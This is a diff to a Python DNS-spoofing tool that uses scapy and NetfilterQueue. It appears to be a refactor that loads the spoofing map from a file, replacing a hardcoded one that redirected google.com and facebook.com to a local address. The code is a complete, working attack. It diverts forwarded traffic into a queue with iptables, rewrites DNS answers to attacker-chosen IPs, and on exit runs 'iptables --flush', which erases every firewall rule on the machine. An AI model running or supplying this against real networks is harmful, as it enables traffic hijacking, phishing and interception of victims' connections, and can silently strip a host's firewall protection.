@@ -3,13 +3,11 @@ from netfilterqueue import NetfilterQueue
 import os
 import argparse
 
-# DNS mapping records, feel free to add/modify this dictionary
-# for example, google.com will be redirected to 192.168.1.100
-dns_hosts = {
-    b"www.google.com.": "10.0.2.4",
-    b"google.com.": "10.0.2.4",
-    b"facebook.com.": "10.0.2.4"
+#Create global variables for arguments (packetfunctions require 1 argument to conform to Netfilterqueue)
+
+dns_map = {
 }
+#Default values
 filename = "map.txt"
 queue_num = 0
 use_print = True
@@ -19,6 +17,7 @@ def resolve_args():
     global queue_num
     global use_print
 
+    #Get the values from the potential arguments
     parser = argparse.ArgumentParser()
     parser.add_argument("-f", "--file", dest = "file", help = "File with replacement map, default map.txt")
     parser.add_argument("-q", "--queue", dest = "queue", help = "Queuenumber of netfilterqueue, default 0")
@@ -33,21 +32,25 @@ def resolve_args():
             use_print = False
     return options
 
+#Fill in the DNS map, every line in file is:
+#{url}-{ipV4}
 def setup_map():
-    global dns_hosts
+    global dns_map
     mapfile = open(filename, 'r')
     lines = mapfile.readlines()
 
-    dns_hosts = {}
+    dns_map = {}
     for line in lines:
         parts = (line.replace("\n","")).split("-")
         site = parts[0]
         ip = parts[1]
+        #dns requests have a . at the end, urls don't so we add them if they were not added
         if(not (site[-1] == '.')):
             site = site + '.'
-        dns_hosts[bytes(site, 'utf-8')] = ip
+        dns_map[bytes(site, 'utf-8')] = ip
     mapfile.close()
 
+#Easy optional print with 2 arguments
 def iPrint(text, second=None):
     if(use_print):
         if(second==None):
@@ -55,84 +58,67 @@ def iPrint(text, second=None):
         else:
             print(text, second)
 
-def process_packet(packet):
-    """
-    Whenever a new packet is redirected to the netfilter queue,
-    this callback is called.
-    """
-    # convert netfilter queue packet to scapy packet
+#Every intercepted packets is send through this function. Because it is a callback, it can only have 1 parameter
+def queue_callback(packet):
+    #Convert raw packet to a scapy packets for inspection
     scapy_packet = IP(packet.get_payload())
+    #Only change DNS responses
     if scapy_packet.haslayer(DNSRR):
-        # if the packet is a DNS Resource Record (DNS reply)
-        # modify the packet
         iPrint("Packet received:")
         iPrint("[IP Before]:", scapy_packet.summary())
         try:
+            #It is a DNS response, so modify the response
             scapy_packet = modify_packet(scapy_packet)
         except IndexError:
-            # not UDP packet, this can be IPerror/UDPerror packets
+            #Index error can occur when selecting the UDP section, just pass the response through to avoid non-responsiveness
             iPrint("IndexError occured")
             pass
         iPrint("[IP After ]:", scapy_packet.summary())
         iPrint("")
-        # set back as netfilter queue packet
+        #Set the payload of the original packet to the modified scapy_packet
         packet.set_payload(bytes(scapy_packet))
-    # accept the packet
+    #Accept the packet, regardless of wheter it was modified
     packet.accept()
 
 
 def modify_packet(packet):
-    """
-    Modifies the DNS Resource Record `packet` ( the answer part)
-    to map our globally defined `dns_hosts` dictionary.
-    For instance, whenver we see a google.com answer, this function replaces 
-    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
-    """
-    # get the DNS question name, the domain name
+    #Get the name of the requested site
     qname = packet[DNSQR].qname
-    if qname not in dns_hosts:
-        # if the website isn't in our record
-        # we don't wanna modify that
+    #Return the packet without modification if it is not in the list of sites to spoof
+    if qname not in dns_map:
         iPrint("no modification:", qname)
         return packet
-    # craft new answer, overriding the original
-    # setting the rdata for the IP we want to redirect (spoofed)
-    # for instance, google.com will be mapped to "192.168.1.100"
-    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
-    # set the answer count to 1
+    #We set the answerfield of the response to our own IP-addres
+    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_map[qname])
     packet[DNS].ancount = 1
-    # delete checksums and length of packet, because we have modified the packet
-    # new calculations are required ( scapy will do automatically )
+    #We remove all lengths and checksums as they are no longer correct and scapy will set the correct values automatically
     del packet[IP].len
     del packet[IP].chksum
     del packet[UDP].len
     del packet[UDP].chksum
 
     iPrint("Modified:", qname)
-    # return the modified packet
+    #Return the packet with the modified resonse
     return packet
 
 
 if __name__ == "__main__":
     resolve_args()
     setup_map()
-    # insert the iptables FORWARD rule
+    #Set the rule in the iptables
     iPrint("Setting up forwarding rule in iptables")
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queue_num))
 
     iPrint("DNS spoofing map:")
-    iPrint(dns_hosts)
-    # instantiate the netfilter queue
+    iPrint(dns_map)
     queue = NetfilterQueue()
     try:
-        # bind the queue number to our callback `process_packet`
-        # and start it
-        queue.bind(queue_num, process_packet)
+        #Bind the callback function to the queue and set it running until it exits with Ctrl+C
+        queue.bind(queue_num, queue_callback)
         iPrint("Starting DNS spoofing")
         queue.run()
     except KeyboardInterrupt:
-        # if want to exit, make sure we
-        # remove that rule we just inserted, going back to normal.
+        #If we exit with Ctrl+C, we remove the rule we set at the start by flushing the tables
         iPrint("Flushing iptables, removing the forwarding rule")
         os.system("iptables --flush")
         iPrint("Program done")
